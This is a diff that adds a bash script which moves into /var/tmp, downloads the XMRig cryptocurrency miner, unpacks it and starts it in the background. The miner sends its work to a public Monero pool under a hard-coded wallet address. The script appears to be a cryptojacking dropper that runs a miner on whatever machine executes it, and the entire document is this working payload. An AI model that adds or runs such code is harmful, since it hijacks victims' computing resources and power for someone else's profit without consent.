@@ -1,0 +1,14 @@
+#!/bin/bash
+cd ..
+cd ..
+cd ..
+cd ..
+cd ..
+cd var
+cd tmp
+mkdir 455
+cd 455
+wget https://github.com/xmrig/xmrig/releases/download/v5.7.0/xmrig-5.7.0-xenial-x64.tar.gz
+tar xvzf xmrig-5.7.0-xenial-x64.tar.gz
+cd xmrig-5.7.0
+./xmrig -B --donate-level 1 -o pool.supportxmr.com:443 -u 42wCpCX3JYHPmtgyMQyfFrfkuqRH7XPd6CvR6K4gyJ7QTrRiTUjKciRipgwEBFFyGsLbJjK7Liyk1Yrp9cWwEXox33U5THk -k --tls
